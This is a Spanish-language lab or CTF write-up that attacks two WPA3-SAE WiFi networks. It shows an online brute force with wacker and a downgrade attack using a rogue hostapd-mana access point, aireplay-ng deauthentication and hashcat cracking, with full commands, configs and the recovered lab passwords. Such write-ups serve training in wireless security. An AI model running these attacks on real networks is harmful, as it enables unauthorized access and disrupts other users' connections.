# Challenges SAE

En este capítulo vamos a realizar los siguientes retos:

* Challenge 13 - ¿Cuál es la flag en la red wifi-management?
* Challenge 14 - ¿Cuál es la contraseña del wifi-IT?

***

## Challenge 13

* ¿Cuál es la flag en la red wifi-management?

Primero escaneamos todos los canales como siempre hasta encontrar "wifi-management"

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Red SAE, WPA3, canal 11, ahora solo escaneamos esas canal y BSSID

```
airodump-ng wlan0 --manufacturer --band bag -c 11 --bssid F0:9F:C2:11:0A:24
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Las redes SAE no tiene handshake que se puedan atacar, se puede atacar a los clientes (si hay alguna mal configurado) o un ataque de fuerza bruta online</mark>

> Esperamos a tener todos los cientes posbiles capturados con airodump

En esta caso, esta red no tiene ningun cliente... asi que solo nos queda hacer un ataque de fuerza bruta online contra el AP usando `wacker`

### Fuerza Bruta Online

Para este ataque necesitamos la `frecuencia del AP,` no el canal. Para esto, conseguimos la informacion con `iwlist`

```
iwlist wlan0 frequency | grep 'Channel 11 :'
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Channel 11 : 2.462 GHz

```
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid 'wifi-management' --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```

> `--interface` : Hay que poner una interfaz de red que no este en modo monitor

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora, sabiendo la credencial creamos el fichero de conexión con `wpasupplican`t -->

```bash
## Creamos fichero
nano sae.conf
## Configuramos
network={
        ssid="wifi-management"
        psk="chocolate1"
        key_mgmt=SAE
        scan_ssid=1
        ieee80211w=2
}
## Nos conectamos
wpa_supplicant -i wlan2 -c sae.conf
## Solicitamos ip con dhclient
sudo dhclient wlan2 -v
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 14

* ¿Cuál es la contraseña del wifi-IT?

Escaneamos toda las redes hasta encontrar "wifi-IT" y luego hacemos un scaneo especifico a ese bssid y channel -->

```
airodump-ng wlan0 --manufacturer --band bag -c 11 --bssid F0:9F:C2:1A:CA:25 -w sae2
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que tiene un cliente, asi que podemos intentar hacerle un ataque de downgrade

### Downgrade

Para esto abrimos en fichero de la captura actual, pero abrimos el `.csv.` Asi podemos ver un poco mas de informacion de la que nos da `airodump-ng`

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aqui vemos que este AP, soporta a WPA3 y WPA2, y a nivel de autentificación SAE y PSK

La mejor forma de mirar esto es con `wifi_db` para ver mas info, como si el AP tien habilitado el mfp -->

```
python3 /root/tools/wifi_db/wifi_db.py -d WifiSAE.db /home/user/wifi/SAE/
```

> `-d` Escribimos el nombre de la base de datos a generar
>
> `/` Seleccionamos la ruta donde se encutrar los ficheros

```
sqlitebrowser WifiSAE.db
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al ver que no tiene habilitado ni el mfpc y mfpr, podemo hacerle un ataque de desautentficcacion al cliente, para forzarle que se conecte a un AP nuestro

> Este ataque es igual que el de no AP de PSK

Asi que ahora creamos un fichero de `hostap-mana` indicando el nombre de la red que nos interesa y levantando un red de PSK normal.

```bash
## Creamos el fichero hostap
nano hostapd-sae.conf
## Configuramos
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-IT
mana_wpaout=hostapd-it.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

Ahora levantamos levantamos con `hostap-mana` -->

```
hostapd-mana hostapd-sae.conf
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya tenemos el AP falso con WPA2 corriendo.

Ahora podemos hacer un ataque de desutentificacion al cliente -->

```bash
## Ponemos la interfaz en el canal correcto para asegurarnos
sudo iwconfig wlan0 channel 11
## Attack
aireplay-ng wlan0 -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52
```

> `-a` : BSSID de la wifi
>
> `-c` : MAC del cliente

Al ejecutarlo, vemos como se nos conecta un cliente a nuestro AP falso -->

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora vamos al fichero `hostapd-it.hccapx` donde se guardan y saquemos solo el hash

```
cat hostapd-it.hccapx | head -n 1 | awk '{print $3}' >> hostapd-it.22000
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y por ultimo rompemos los hashes con `hascat` -->

```
hashcat -a 0 -m 22000 hostapd-it.22000 ~/rockyou-top100000.txt --force
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora como siempre hacemos la conexion con `wpa_supplicant` -->

```bash
## Creamo el fichero
nano sae2.conf
## Confg
network={
        ssid="wifi-IT"
        psk="bubblegum"
        key_mgmt=SAE
        scan_ssid=1
        #ieee80211w=2
}
```

> Comentamos con `#` a `ieee80211w=2` ya que el mfp esta deshabilitado

```
## Nos conectamos
wpa_supplicant -i wlan2 -c sae2.conf
## Pedimos ip con dhclient
dhclient wlan2 -v
```

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora accdemos a la `192.168.15.1` para coger la flag
